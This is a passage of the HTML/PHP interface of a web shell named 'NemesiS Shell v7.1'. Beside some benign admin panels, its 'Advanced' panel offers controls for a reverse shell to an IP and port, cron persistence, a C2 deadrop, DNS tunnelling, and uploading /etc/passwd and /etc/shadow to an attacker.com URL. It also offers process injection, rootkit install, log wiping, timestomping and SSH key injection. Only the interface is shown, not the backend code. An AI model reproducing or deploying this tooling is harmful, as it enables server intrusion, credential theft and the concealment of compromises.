    <div class="trow"><div class="tf"><label>Mode</label><select class="ti" id="ds-t"><option value="content">File content</option><option value="name">File name</option><option value="perm">Permission</option></select></div><div class="tf"><label>Ext</label><input class="ti" id="ds-e" placeholder="php,js..."></div><button class="tb2" onclick="doDS()">Search</button></div>
    <div class="rbox" id="ds-r">-</div></div>
    <div class="dcard"><div class="tt">Deep Scan</div>
    <div class="trow"><div class="tf"><label>Dir</label><input class="ti" id="dsc-d" placeholder="<?=esc($cwd)?>"></div><div class="tf"><label>Depth</label><select class="ti" id="dsc-dep"><option value="2">2</option><option value="3" selected>3</option><option value="5">5</option><option value="10">10</option></select></div><button class="tb2" onclick="doDScan()">Scan</button></div>
    <div class="rbox" id="dsc-r">-</div></div>
    <div class="dcard"><div class="tt">Deep Analysis</div>
    <div class="trow"><div class="tf"><label>Dir</label><input class="ti" id="da-d" placeholder="<?=esc($cwd)?>"></div><button class="tb2" onclick="doDA()">Analyze</button></div>
    <div class="rbox" id="da-r">-</div></div>
    <div class="dcard"><div class="tt">Deep Monitor</div>
    <div class="trow"><div class="tf"><label>Dir</label><input class="ti" id="dm-d" placeholder="<?=esc($cwd)?>"></div></div>
    <div class="trow"><button class="tb2" onclick="doSnap()">Snapshot</button><button class="tb2" onclick="doSnapChk()">Check</button></div>
    <div class="rbox" id="dm-r">Take snapshot first.</div></div>
    <div class="dcard"><div class="tt">Diff Viewer</div>
    <div class="trow"><div class="tf"><label>File 1</label><input class="ti" id="diff-f1" placeholder="path/to/file1"></div><div class="tf"><label>File 2</label><input class="ti" id="diff-f2" placeholder="path/to/file2"></div><button class="tb2" onclick="doDiff()">Diff</button></div>
    <div class="rbox" id="diff-r" style="font-family:inherit">-</div></div>
    </div>
    </div>
    <!-- Network -->
    <div class="panel" id="panel-network">
    <div class="tbox">
    <div class="tt">Whois</div>
    <div class="trow"><div class="tf"><label>Domain/IP</label><input class="ti" id="w-d" placeholder="example.com"></div><button class="tb2" onclick="doWhois()">Lookup</button></div>
    <div class="rbox" id="w-r">-</div>
    <div class="tt">Reverse IP</div>
    <div class="trow"><div class="tf"><label>IP</label><input class="ti" id="ri-i" placeholder="1.2.3.4"></div><button class="tb2" onclick="doRIP()">Resolve</button></div>
    <div class="rbox" id="ri-r">-</div>
    <div class="tt">Port Scanner</div>
    <div class="trow"><div class="tf"><label>Host</label><input class="ti" id="ps-h" placeholder="localhost"></div><div class="tf"><label>Ports</label><input class="ti" id="ps-p" value="21,22,80,443,3306,8080"></div><button class="tb2" onclick="doPScan()">Scan</button></div>
    <div class="rbox" id="ps-r">-</div>
    </div>
    </div>
    <!-- Hash -->
    <div class="panel" id="panel-hashing">
    <div class="tbox">
    <div class="tt">Hash Generator</div>
    <div class="trow"><div class="tf"><label>Input</label><input class="ti" id="hg-i" placeholder="text..."></div><button class="tb2" onclick="doHashGen()">Generate</button></div>
    <div class="rbox" id="hg-r">-</div>
    <div class="tt">Hash Identifier</div>
    <div class="trow"><div class="tf"><label>Hash</label><input class="ti" id="hi-i" placeholder="paste hash..."></div><button class="tb2" onclick="doHashID()">Identify</button></div>
    <div class="rbox" id="hi-r">-</div>
    </div>
    </div>
    <!-- Strings -->
    <div class="panel" id="panel-strings">
    <div class="tbox">
    <div class="tt">String Tools</div>
    <div class="tf"><label>Input</label><textarea class="ti ta" id="st-i" rows="3" placeholder="text..."></textarea></div>
    <div class="trow" style="flex-wrap:wrap;gap:3px">
    <?php foreach(['b64enc'=>'B64 Enc','b64dec'=>'B64 Dec','urlencode'=>'URL Enc','urldecode'=>'URL Dec','htmlenc'=>'HTML Enc','htmldec'=>'HTML Dec','hexenc'=>'Hex Enc','hexdec'=>'Hex Dec','md5'=>'MD5','rot13'=>'ROT13','upper'=>'UPPER','lower'=>'lower','reverse'=>'Reverse','strlen'=>'Len','wordcount'=>'Words'] as $k=>$v) echo "<button class='tb2' style='font-size:8px;padding:3px 7px' onclick='doStr(\"$k\")'>{$v}</button>"; ?>
    </div>
    <div class="rbox" id="st-r">-</div>
    </div>
    </div>
    <!-- CMS -->
    <div class="panel" id="panel-scanner">
    <div class="tbox">
    <div class="tt">CMS Detector</div>
    <div class="trow"><div class="tf"><label>URL</label><input class="ti" id="cm-u" placeholder="https://example.com"></div><button class="tb2" onclick="doCMS()">Detect</button></div>
    <div class="rbox" id="cm-r">-</div>
    <div class="tt">Disable Functions</div>
    <button class="tb2" onclick="doDF()" style="align-self:flex-start">Check</button>
    <div class="rbox" id="df-r">-</div>
    </div>
    </div>
    <!-- Security -->
    <div class="panel" id="panel-security">
    <div class="dgrid">
    <div class="dcard"><div class="tt">Permission Auditor</div>
    <div class="trow"><div class="tf"><label>Dir</label><input class="ti" id="pa-d" placeholder="<?=esc($cwd)?>"></div><button class="tb2" onclick="doPermAudit()">Audit</button></div>
    <div class="rbox" id="pa-r">-</div></div>
    <div class="dcard"><div class="tt">Log Analyzer</div>
    <div class="trow"><div class="tf"><label>Log File</label><select class="ti" id="la-f"><option value="/var/log/apache2/access.log">Apache Access</option><option value="/var/log/apache2/error.log">Apache Error</option><option value="/var/log/nginx/access.log">Nginx Access</option><option value="/var/log/auth.log">Auth Log</option><option value="/var/log/syslog">Syslog</option></select></div><button class="tb2" onclick="doLogAn()">Analyze</button></div>
    <input class="ti" id="la-c" placeholder="or custom path..." style="font-size:9px;margin-top:2px">
    <div class="rbox" id="la-r">-</div></div>
    <div class="dcard"><div class="tt">Brute Force Detector</div>
    <div class="trow"><div class="tf"><label>Auth Log</label><select class="ti" id="bf-f"><option value="/var/log/auth.log">auth.log (Debian)</option><option value="/var/log/secure">secure (CentOS)</option><option value="/var/log/messages">messages</option></select></div><button class="tb2" onclick="doBF()">Detect</button></div>
    <div class="rbox" id="bf-r">-</div></div>
    <div class="dcard"><div class="tt">HTTP Security Headers</div>
    <div class="trow"><div class="tf"><label>URL</label><input class="ti" id="hh-u" placeholder="https://example.com"></div><button class="tb2" onclick="doHTTPH()">Check</button></div>
    <div class="rbox" id="hh-r">-</div></div>
    <div class="dcard"><div class="tt">SSL/TLS Certificate</div>
    <div class="trow"><div class="tf"><label>Hostname</label><input class="ti" id="ssl-h" placeholder="example.com"></div><button class="tb2" onclick="doSSL()">Check</button></div>
    <div class="rbox" id="ssl-r">-</div></div>
    <div class="dcard"><div class="tt">PHP Security Checklist</div>
    <button class="tb2" onclick="doSecCL()" style="align-self:flex-start">Run Checklist</button>
    <div class="rbox" id="sc-r">-</div></div>
    </div>
    </div>
    <!-- CVE -->
    <div class="panel" id="panel-cve">
    <div style="display:flex;flex-direction:column;flex:1;min-height:0;gap:5px">
    <div class="cve-tabs">
    <button class="cve-tab on" onclick="cveTab('lookup',this)">Lookup by ID</button>
    <button class="cve-tab" onclick="cveTab('search',this)">Search</button>
    <button class="cve-tab" onclick="cveTab('recent',this)">Terbaru</button>
    </div>
    <div id="cvep-lookup" style="display:flex;flex-direction:column;gap:5px;flex:1;min-height:0">
    <div class="tbox" style="flex:unset">
    <div class="tt">CVE Lookup - NVD/NIST API</div>
    <div class="trow"><div class="tf"><label>CVE ID</label><input class="ti" id="cve-id" placeholder="CVE-2024-1234" onkeydown="if(event.key==='Enter')doCVEL()"></div><button class="tb2" onclick="doCVEL()">Lookup</button></div>
    <div style="font-size:8px;color:var(--dim)">Real-time from nvd.nist.gov | Ctrl+Shift+C = quick lookup</div>
    </div>
    <div class="rbox" id="cve-l-r" style="flex:1;max-height:none;min-height:80px">Enter CVE ID then click Lookup.</div>
    </div>
    <div id="cvep-search" style="display:none;flex-direction:column;gap:5px;flex:1;min-height:0">
    <div class="tbox" style="flex:unset">
    <div class="tt">CVE Search by Keyword</div>
    <div class="trow"><div class="tf"><label>Keyword</label><input class="ti" id="cve-kw" placeholder="nginx, apache, php..." onkeydown="if(event.key==='Enter')doCVES()"></div><div class="tf"><label>Tahun</label><input class="ti" id="cve-yr" placeholder="2024" type="number"></div><div class="tf"><label>Severity</label><select class="ti" id="cve-sv"><option value="">Semua</option><option value="CRITICAL">CRITICAL</option><option value="HIGH">HIGH</option><option value="MEDIUM">MEDIUM</option><option value="LOW">LOW</option></select></div><button class="tb2" onclick="doCVES()">Search</button></div>
    </div>
    <div class="rbox" id="cve-s-r" style="flex:1;max-height:none;min-height:80px">-</div>
    </div>
    <div id="cvep-recent" style="display:none;flex-direction:column;gap:5px;flex:1;min-height:0">
    <div class="tbox" style="flex:unset">
    <div class="tt">20 CVE Terbaru (Realtime NVD)</div>
    <div style="display:flex;gap:6px;align-items:center"><button class="tb2" onclick="doCVER()">Load</button><span style="font-size:8px;color:var(--dim)">Click CVE ID to lookup detail</span></div>
    </div>
    <div class="rbox" id="cve-r-r" style="flex:1;max-height:none;min-height:80px">Click Load to fetch latest CVEs.</div>
    </div>
    </div>
    </div>
    <!-- SysInfo -->
    <div class="panel" id="panel-sysinfo">
    <div class="tbox">
    <div class="tt">System Dashboard</div>
    <div class="si-grid">
    <div class="si-c"><label>PHP</label><p><?=esc($phpver)?></p></div>
    <div class="si-c"><label>Host</label><p><?=esc($hostname)?></p></div>
    <div class="si-c"><label>IP</label><p><?=esc($serverip)?></p></div>
    <div class="si-c"><label>User</label><p><?=esc($sysuser)?></p></div>
    <div class="si-c"><label>Disk</label><p id="si-disk">-</p><div class="disk-bar"><div class="disk-fill" id="si-df" style="width:0%"></div></div></div>
    <div class="si-c"><label>Uptime</label><p id="si-up">-</p></div>
    <div class="si-c"><label>Load</label><p id="si-load">-</p></div>
    <div class="si-c"><label>Mem Limit</label><p><?=ini_get('memory_limit')?></p></div>
    <div class="si-c"><label>Upload Max</label><p><?=ini_get('upload_max_filesize')?></p></div>
    <div class="si-c"><label>OS</label><p><?=esc($os)?></p></div>
    </div>
    <button class="tb2" onclick="doSI()" style="align-self:flex-start;margin-top:4px">Refresh</button>
    <div class="rbox" id="si-r" style="font-size:9px">-</div>
    <div class="tt">PHP Extensions</div>
    <div class="rbox" id="si-ext">-</div>
    <div class="tt">Processes</div>
    <button class="tb2" onclick="doPS()" style="align-self:flex-start">Load</button>
    <div class="rbox" id="si-ps">-</div>
    <div class="tt">Activity Log</div>
    <button class="tb2" onclick="loadLog()" style="align-self:flex-start">Load</button>
    <div id="alog"><div style="color:var(--dim);font-size:8.5px">Click Load...</div></div>
    <div class="tt">Change Password</div>
    <div class="trow">
    <div class="tf"><label>Old</label><input class="ti" type="password" id="cp-o"></div>
    <div class="tf"><label>New (min 6)</label><input class="ti" type="password" id="cp-n"></div>
    <button class="tb2" onclick="chgPass()">Change</button>
    </div>
    </div>
    </div>
    <!-- Config -->
    <div class="panel" id="panel-cfg">
    <div class="tbox">
    <div class="tt">Command Aliases</div>
    <div class="trow"><div class="tf"><label>Alias</label><input class="ti" id="al-n" placeholder="ll"></div><div class="tf"><label>Command</label><input class="ti" id="al-c" placeholder="ls -la"></div><button class="tb2" onclick="addAlias()">+ Add</button></div>
    <div id="alias-list"></div>
    <div class="tt">Pinned Commands</div>
    <div class="trow"><div class="tf"><label>Command</label><input class="ti" id="pin-c" placeholder="ls -la /var/www"></div><button class="tb2" onclick="addPinM()">+ Pin</button></div>
    <div id="pin-list"></div>
    <div class="tt">Command Queue</div>
    <div class="trow"><div class="tf"><label>Command</label><input class="ti" id="q-c" placeholder="ls -la"></div><button class="tb2" onclick="addQ(document.getElementById('q-c').value.trim());document.getElementById('q-c').value=''">+ Queue</button><button class="tb2" style="border-color:var(--d);color:var(--d)" onclick="clearQ()">Clear</button></div>
    <div id="queue-list"></div>
    <div class="tt">Security Info</div>
    <div class="rbox" style="font-size:8.5px">Client IP: <b><?=esc($_SERVER['REMOTE_ADDR'])?></b>
    CSRF Token: <b>Active</b> | Rate Limit: <b>Active</b> | Session FP: <b>Active</b>
    IP Whitelist: <b><?=empty($IP_WHITELIST)?'OFF':'ON - '.implode(', ',$IP_WHITELIST)?></b>
    Session: <b><?=esc(substr(session_id(),0,16))?>...</b></div>
    </div>
    </div>
    <!-- Cheatsheet -->
    <div class="panel" id="panel-cheatsheet">
    <div class="tbox">
    <div class="tt">Shortcuts & Commands</div>
    <div id="cs-grid">
    <div class="cs-s"><h3>Terminal</h3>
    <div class="cs-r"><span class="cs-k">Ctrl+R</span><span class="cs-d">History search</span></div>
    <div class="cs-r"><span class="cs-k">Ctrl+P</span><span class="cs-d">Command palette</span></div>
    <div class="cs-r"><span class="cs-k">Shift+Enter</span><span class="cs-d">Multi-line input</span></div>
    <div class="cs-r"><span class="cs-k">Ctrl+G</span><span class="cs-d">Filter output</span></div>
    <div class="cs-r"><span class="cs-k">Ctrl+F</span><span class="cs-d">Search output</span></div>
    <div class="cs-r"><span class="cs-k">Alt+←/→</span><span class="cs-d">Dir back/forward</span></div>
    <div class="cs-r"><span class="cs-k">→ (end)</span><span class="cs-d">Accept ghost text</span></div>
    <div class="cs-r"><span class="cs-k">↑/↓</span><span class="cs-d">History nav</span></div>
    <div class="cs-r"><span class="cs-k">Tab</span><span class="cs-d">Autocomplete</span></div>
    <div class="cs-r"><span class="cs-k">Ctrl+L</span><span class="cs-d">Clear</span></div>
    </div>
    <div class="cs-s"><h3>Editor</h3>
    <div class="cs-r"><span class="cs-k">Ctrl+S</span><span class="cs-d">Save</span></div>
    <div class="cs-r"><span class="cs-k">Ctrl+H</span><span class="cs-d">Find & Replace</span></div>
    <div class="cs-r"><span class="cs-k">Ctrl+G</span><span class="cs-d">Go to line</span></div>
    <div class="cs-r"><span class="cs-k">Ctrl+W</span><span class="cs-d">Close tab</span></div>
    <div class="cs-r"><span class="cs-k">Auto-save</span><span class="cs-d">30 seconds</span></div>
    </div>
    <div class="cs-s"><h3>File Manager</h3>
    <div class="cs-r"><span class="cs-k">📝</span><span class="cs-d">Edit file</span></div>
    <div class="cs-r"><span class="cs-k">📋</span><span class="cs-d">Clone</span></div>
    <div class="cs-r"><span class="cs-k">✏️</span><span class="cs-d">Rename</span></div>
    <div class="cs-r"><span class="cs-k">📦/📂</span><span class="cs-d">Zip/Unzip</span></div>
    <div class="cs-r"><span class="cs-k">👁</span><span class="cs-d">Preview inline</span></div>
    <div class="cs-r"><span class="cs-k">🔒/🔏</span><span class="cs-d">chmod 775/444</span></div>
    <div class="cs-r"><span class="cs-k">⬇</span><span class="cs-d">Download</span></div>
    <div class="cs-r"><span class="cs-k">☑</span><span class="cs-d">Bulk select</span></div>
    <div class="cs-r"><span class="cs-k">Goto</span><span class="cs-d">Quick navigation</span></div>
    </div>
    <div class="cs-s"><h3>CVE & Security</h3>
    <div class="cs-r"><span class="cs-k">Ctrl+Shift+C</span><span class="cs-d">Quick CVE lookup</span></div>
    <div class="cs-r"><span class="cs-k">CVE Panel</span><span class="cs-d">Lookup/Search/Recent</span></div>
    <div class="cs-r"><span class="cs-k">Perm Audit</span><span class="cs-d">Check permissions</span></div>
    <div class="cs-r"><span class="cs-k">Log Analyzer</span><span class="cs-d">Detect suspicious</span></div>
    <div class="cs-r"><span class="cs-k">HTTP Headers</span><span class="cs-d">Security score</span></div>
    <div class="cs-r"><span class="cs-k">SSL Check</span><span class="cs-d">Cert validity</span></div>
    </div>
    <div class="cs-s"><h3>Commands</h3>
    <div class="cs-r"><span class="cs-k">ls -la</span><span class="cs-d">List + perms</span></div>
    <div class="cs-r"><span class="cs-k">find / -name</span><span class="cs-d">Find file</span></div>
    <div class="cs-r"><span class="cs-k">df -h</span><span class="cs-d">Disk usage</span></div>
    <div class="cs-r"><span class="cs-k">ps aux</span><span class="cs-d">Processes</span></div>
    <div class="cs-r"><span class="cs-k">netstat -an</span><span class="cs-d">Connections</span></div>
    <div class="cs-r"><span class="cs-k">goto /path</span><span class="cs-d">Alias for cd</span></div>
    </div>
    <div class="cs-s"><h3>Themes</h3>
    <div class="cs-r"><span class="cs-k">Gold</span><span class="cs-d">Amber/Red</span></div>
    <div class="cs-r"><span class="cs-k">Dark Gold</span><span class="cs-d">Deep amber</span></div>
    <div class="cs-r"><span class="cs-k">Light</span><span class="cs-d">Clean warm</span></div>
    <div class="cs-r"><span class="cs-k">Custom</span><span class="cs-d">Color picker</span></div>
    </div>
    </div>
    </div>
    </div>
    <!-- About -->
    <div class="panel" id="panel-about">
    <div class="tbox">
    <div class="tt">About NemesiS Shell</div>
    <div class="ag">
    <div class="ac2"><label>Shell</label><p>NemesiS v7.1</p></div>
    <div class="ac2"><label>Author</label><p>MataKucing</p></div>
    <div class="ac2"><label>User</label><p><?=esc($user)?></p></div>
    <div class="ac2"><label>Sys User</label><p><?=esc($sysuser)?></p></div>
    <div class="ac2"><label>Hostname</label><p><?=esc($hostname)?></p></div>
    <div class="ac2"><label>IP</label><p><?=esc($serverip)?></p></div>
    <div class="ac2"><label>PHP</label><p><?=esc($phpver)?></p></div>
    <div class="ac2"><label>OS</label><p><?=esc($os)?></p></div>
    <div class="ac2"><label>Server</label><p><?=esc($_SERVER['SERVER_SOFTWARE']??'N/A')?></p></div>
    <div class="ac2"><label>Disk Free</label><p><?=round(disk_free_space('/')/1073741824,2)?> GB</p></div>
    <div class="ac2"><label>Client IP</label><p><?=esc($_SERVER['REMOTE_ADDR'])?></p></div>
    <div class="ac2"><label>Features</label><p>Terminal, Files, Deep, Security, CVE, Network, Hash, Strings, Advanced</p></div>
    <div class="ac2"><label>UI Font</label><p>JetBrains Mono + Space Grotesk</p></div>
    </div>
    <div class="author-foot" style="margin-top:8px;border-top:1px solid var(--b);padding-top:6px">⚡ crafted by <span>MataKucing</span> ⚡</div>
    </div>
    </div>
    <!-- Advanced -->
    <div class="panel" id="panel-advanced">
    <div style="display:grid;grid-template-columns:repeat(auto-fit,minmax(280px,1fr));gap:8px;flex:1;overflow-y:auto;padding:4px">
    <!-- Stealth -->
    <div style="background:var(--s);border:1px solid var(--b);border-radius:6px;padding:10px">
    <div style="color:var(--a3);font-weight:700;font-size:9px;text-transform:uppercase;border-bottom:1px solid var(--b);padding-bottom:4px;margin-bottom:6px">Stealth</div>
    <button class="tb2" onclick="advAct('adv_stealth_evasion')">Evasion</button>
    <div style="margin-top:4px;display:flex;gap:3px;flex-wrap:wrap">
    <input class="ti" id="adv-msg" placeholder="Message" style="font-size:9px;padding:3px 5px;flex:1">
    <button class="tb2" onclick="advEncrypt()">Encrypt</button>
    </div>
    <div class="rbox" id="adv-stealth-out" style="font-size:8px;max-height:80px;min-height:30px">-</div>
    </div>
    <!-- Persistence -->
    <div style="background:var(--s);border:1px solid var(--b);border-radius:6px;padding:10px">
    <div style="color:var(--w);font-weight:700;font-size:9px;text-transform:uppercase;border-bottom:1px solid var(--b);padding-bottom:4px;margin-bottom:6px">Persistence</div>
    <div style="display:flex;gap:3px;flex-wrap:wrap">
    <input class="ti" id="adv-rip" placeholder="IP" style="width:80px;font-size:9px;padding:2px 4px" value="192.168.1.100">
    <input class="ti" id="adv-rport" placeholder="Port" style="width:50px;font-size:9px;padding:2px 4px" value="4444">
    <button class="tb2" onclick="advReverse()">Reverse</button>
    </div>
    <div style="display:flex;gap:3px;flex-wrap:wrap;margin-top:3px">
    <input class="ti" id="adv-ccmd" placeholder="Command" style="flex:1;font-size:9px;padding:2px 4px">
    <input class="ti" id="adv-csch" placeholder="*/10" style="width:50px;font-size:9px;padding:2px 4px" value="*/10">
    <button class="tb2" onclick="advCron()">Cron</button>
    </div>
    <div style="display:flex;gap:3px;margin-top:3px">
    <input class="ti" id="adv-durl" placeholder="C2 URL" style="flex:1;font-size:9px;padding:2px 4px">
    <button class="tb2" onclick="advDeadrop()">Deadrop</button>
    </div>
    <div class="rbox" id="adv-persist-out" style="font-size:8px;max-height:60px;min-height:20px">-</div>
    </div>
    <!-- Resilience -->
    <div style="background:var(--s);border:1px solid var(--b);border-radius:6px;padding:10px">
    <div style="color:var(--a2);font-weight:700;font-size:9px;text-transform:uppercase;border-bottom:1px solid var(--b);padding-bottom:4px;margin-bottom:6px">Resilience</div>
    <div style="display:flex;gap:3px;flex-wrap:wrap">
    <input class="ti" id="adv-dnsd" placeholder="Data" style="flex:1;font-size:9px;padding:2px 4px" value="test">
    <button class="tb2" onclick="advDNS()">DNS Tunnel</button>
    </div>
    <div style="display:flex;gap:3px;margin-top:3px">
    <input class="ti" id="adv-fragd" placeholder="Data" style="flex:1;font-size:9px;padding:2px 4px" value="test">
    <input class="ti" id="adv-fragsz" placeholder="Size" style="width:50px;font-size:9px;padding:2px 4px" value="100">
    <button class="tb2" onclick="advFragment()">Fragment</button>
    </div>
    <div class="rbox" id="adv-resilience-out" style="font-size:8px;max-height:60px;min-height:20px">-</div>
    </div>
    <!-- Lateral -->
    <div style="background:var(--s);border:1px solid var(--b);border-radius:6px;padding:10px">
    <div style="color:var(--p);font-weight:700;font-size:9px;text-transform:uppercase;border-bottom:1px solid var(--b);padding-bottom:4px;margin-bottom:6px">Lateral</div>
    <button class="tb2" onclick="advAct('adv_lateral_harvest')">Harvest</button>
    <div style="display:flex;gap:3px;margin-top:3px">
    <input class="ti" id="adv-snet" placeholder="192.168.1.0/24" style="flex:1;font-size:9px;padding:2px 4px" value="192.168.1.0/24">
    <button class="tb2" onclick="advScan()">Scan</button>
    </div>
    <div class="rbox" id="adv-lateral-out" style="font-size:8px;max-height:60px;min-height:20px">-</div>
    </div>
    <!-- Cleanup -->
    <div style="background:var(--s);border:1px solid var(--b);border-radius:6px;padding:10px">
    <div style="color:var(--d);font-weight:700;font-size:9px;text-transform:uppercase;border-bottom:1px solid var(--b);padding-bottom:4px;margin-bottom:6px">Cleanup</div>
    <button class="tb2" onclick="advAct('adv_cleanup_logs')">Logs</button>
    <button class="tb2" onclick="advAct('adv_cleanup_history')">History</button>
    <div style="display:flex;gap:3px;margin-top:3px">
    <input class="ti" id="adv-cf" placeholder="/path/to/file" style="flex:1;font-size:9px;padding:2px 4px">
    <button class="tb2" onclick="advCleanFile()">Remove</button>
    </div>
    <div class="rbox" id="adv-cleanup-out" style="font-size:8px;max-height:60px;min-height:20px">-</div>
    </div>
    <!-- System Monitoring -->
    <div style="background:var(--s);border:1px solid var(--b);border-radius:6px;padding:10px">
    <div style="color:#38bdf8;font-weight:700;font-size:9px;text-transform:uppercase;border-bottom:1px solid var(--b);padding-bottom:4px;margin-bottom:6px">System Monitor</div>
    <button class="tb2" onclick="doSysmon()">Refresh Stats</button>
    <div class="rbox" id="sysmon-out" style="font-size:8px;max-height:200px;min-height:40px;white-space:pre-wrap">Click to load system data.</div>
    </div>
    <!-- Cloud Sync -->
    <div style="background:var(--s);border:1px solid var(--b);border-radius:6px;padding:10px">
    <div style="color:#34d399;font-weight:700;font-size:9px;text-transform:uppercase;border-bottom:1px solid var(--b);padding-bottom:4px;margin-bottom:6px">Cloud Sync</div>
    <div style="display:flex;gap:3px;flex-wrap:wrap">
    <input class="ti" id="sync-paths" placeholder="/etc/passwd,/etc/shadow" style="flex:1;font-size:9px;padding:2px 4px" value="/etc/passwd,/etc/shadow">
    <input class="ti" id="sync-url" placeholder="https://attacker.com/upload.php" style="flex:1;font-size:9px;padding:2px 4px">
    </div>
    <button class="tb2" onclick="doSyncCloud()">Upload</button>
    <div class="rbox" id="sync-out" style="font-size:8px;max-height:60px;min-height:20px">-</div>
    </div>
    <!-- Process Injection -->
    <div style="background:var(--s);border:1px solid var(--b);border-radius:6px;padding:10px">
    <div style="color:#f472b6;font-weight:700;font-size:9px;text-transform:uppercase;border-bottom:1px solid var(--b);padding-bottom:4px;margin-bottom:6px">Process Injection</div>
    <div style="display:flex;gap:3px;flex-wrap:wrap">
    <input class="ti" id="inj-pid" placeholder="PID" style="width:60px;font-size:9px;padding:2px 4px" value="1">
    <input class="ti" id="inj-cmd" placeholder="command" style="flex:1;font-size:9px;padding:2px 4px" value="id">
    <button class="tb2" onclick="doProcessInject()">Inject</button>
    </div>
    <div class="rbox" id="inj-out" style="font-size:8px;max-height:60px;min-height:20px">-</div>
    </div>
    <!-- Self Destruct -->
    <div style="background:var(--s);border:1px solid var(--b);border-radius:6px;padding:10px">
    <div style="color:#f87171;font-weight:700;font-size:9px;text-transform:uppercase;border-bottom:1px solid var(--b);padding-bottom:4px;margin-bottom:6px">Self Destruct</div>
    <div style="display:flex;gap:3px;flex-wrap:wrap">
    <button class="tb2" style="border-color:var(--d);color:var(--d);font-weight:700" onclick="doSelfDestruct()">NUKE & DELETE</button>
    </div>
    <div style="font-size:7px;color:var(--dim);margin-top:2px">⚠️ Will delete shell file + clear all logs</div>
    <div class="rbox" id="sd-out" style="font-size:8px;max-height:30px;min-height:15px">-</div>
    </div>
    <!-- Rootkit -->
    <div style="background:var(--s);border:1px solid var(--b);border-radius:6px;padding:10px">
    <div style="color:#c084fc;font-weight:700;font-size:9px;text-transform:uppercase;border-bottom:1px solid var(--b);padding-bottom:4px;margin-bottom:6px">Rootkit</div>
    <button class="tb2" onclick="doRootkitInstall()">Install Full Rootkit</button>
    <div style="display:flex;gap:3px;margin-top:3px;flex-wrap:wrap">
    <input class="ti" id="rk-path" placeholder="/path/to/file" style="flex:1;font-size:9px;padding:2px 4px" value="<?=__FILE__?>">
    <button class="tb2" onclick="doRootkitHideFile()">Hide + Lock</button>
    </div>
    <div style="display:flex;gap:3px;margin-top:3px;flex-wrap:wrap">
    <input class="ti" id="rk-kill" placeholder="process name" style="flex:1;font-size:9px;padding:2px 4px" value="tcpdump">
    <button class="tb2" onclick="doRootkitKill()">Kill</button>
    </div>
    <div class="rbox" id="rk-out" style="font-size:8px;max-height:80px;min-height:20px">-</div>
    </div>
    <!-- Auto Privesc -->
    <div style="background:var(--s);border:1px solid var(--b);border-radius:6px;padding:10px">
    <div style="color:#facc15;font-weight:700;font-size:9px;text-transform:uppercase;border-bottom:1px solid var(--b);padding-bottom:4px;margin-bottom:6px">Auto Privesc</div>
    <button class="tb2" onclick="doPrivesc()">Scan Vectors</button>
    <div class="rbox" id="privesc-out" style="font-size:8px;max-height:140px;min-height:30px;white-space:pre-wrap">Click to scan SUID, Sudo, Cron, .env</div>
    </div>
    <!-- Watchdog -->
    <div style="background:var(--s);border:1px solid var(--b);border-radius:6px;padding:10px">
    <div style="color:#f472b6;font-weight:700;font-size:9px;text-transform:uppercase;border-bottom:1px solid var(--b);padding-bottom:4px;margin-bottom:6px">Auto-Heal Watchdog</div>
    <button class="tb2" onclick="doWatchdog()">Install Watchdog</button>
    <div class="rbox" id="watchdog-out" style="font-size:8px;max-height:50px;min-height:20px">-</div>
    </div>
    <!-- Memory Payload -->
    <div style="background:var(--s);border:1px solid var(--b);border-radius:6px;padding:10px">
    <div style="color:#22d3ee;font-weight:700;font-size:9px;text-transform:uppercase;border-bottom:1px solid var(--b);padding-bottom:4px;margin-bottom:6px">Memory Payload</div>
    <div style="display:flex;gap:3px;flex-wrap:wrap">
    <textarea class="ti" id="mem-payload" placeholder="base64 payload or raw script" style="flex:1;font-size:8px;padding:2px 4px;height:40px;resize:vertical"></textarea>
    </div>
    <div style="display:flex;gap:3px;flex-wrap:wrap;margin-top:3px">
    <input class="ti" id="mem-cmd" placeholder="Direct command (optional)" style="flex:1;font-size:9px;padding:2px 4px">
    <button class="tb2" onclick="doMemoryPayload()">Inject Memory</button>
    </div>
    <div class="rbox" id="mem-out" style="font-size:8px;max-height:40px;min-height:15px">-</div>
    </div>
    <!-- Obfuscator -->
    <div style="background:var(--s);border:1px solid var(--b);border-radius:6px;padding:10px">
    <div style="color:#a78bfa;font-weight:700;font-size:9px;text-transform:uppercase;border-bottom:1px solid var(--b);padding-bottom:4px;margin-bottom:6px">Self-Obfuscator</div>
    <button class="tb2" onclick="doObfuscate()">Obfuscate This Shell</button>
    <div class="rbox" id="obf-out" style="font-size:8px;max-height:50px;min-height:15px">-</div>
    </div>
    <!-- Timestomp -->
    <div style="background:var(--s);border:1px solid var(--b);border-radius:6px;padding:10px">
    <div style="color:#f59e0b;font-weight:700;font-size:9px;text-transform:uppercase;border-bottom:1px solid var(--b);padding-bottom:4px;margin-bottom:6px">Log Timestomp</div>
    <div style="display:flex;gap:3px;flex-wrap:wrap">
    <input class="ti" id="ts-log" placeholder="/var/log/apache2/access.log" style="flex:1;font-size:9px;padding:2px 4px" value="/var/log/apache2/access.log">
    <input class="ti" id="ts-ref" placeholder="/etc/passwd" style="flex:1;font-size:9px;padding:2px 4px" value="/etc/passwd">
    </div>
    <button class="tb2" onclick="doTimestomp()">Stomp Timestamp</button>
    <div class="rbox" id="ts-out" style="font-size:8px;max-height:40px;min-height:15px">-</div>
    </div>
    <!-- SSH Key Inject -->
    <div style="background:var(--s);border:1px solid var(--b);border-radius:6px;padding:10px">
    <div style="color:#34d399;font-weight:700;font-size:9px;text-transform:uppercase;border-bottom:1px solid var(--b);padding-bottom:4px;margin-bottom:6px">SSH Key Inject</div>
    <textarea class="ti" id="ssh-key" placeholder="ssh-rsa AAAAB3NzaC1yc2EAAA..." style="font-size:8px;padding:2px 4px;height:50px;resize:vertical"></textarea>
    <button class="tb2" onclick="doSSHInject()">Inject SSH Key</button>
    <div class="rbox" id="ssh-out" style="font-size:8px;max-height:40px;min-height:15px">-</div>
    </div>
    </div>
    </div>
    <!-- End Advanced -->
    </div>
    <!-- statusbar -->
    <div id="statusbar">
    <div class="sb-item">🕐 <b id="sb-time">-</b></div>
    <div class="sb-item">📁 <b id="sb-cwd" style="max-width:200px;overflow:hidden;text-overflow:ellipsis;white-space:nowrap">-</b></div>
    <div class="sb-item">⚡ <b id="sb-cmd" style="max-width:200px;overflow:hidden;text-overflow:ellipsis;white-space:nowrap">-</b></div>
    <div class="sb-sec">🔒 CSRF+RL+FP+REGEN</div>
    <div style="flex:1"></div>
    <div class="sb-item">IP: <b><?=esc($_SERVER['REMOTE_ADDR'])?></b></div>
    <div class="sb-item">MataKucing ⚡</div>
    </div>
    </div>
    <div id="ac"></div>
    <!-- Editor overlay -->
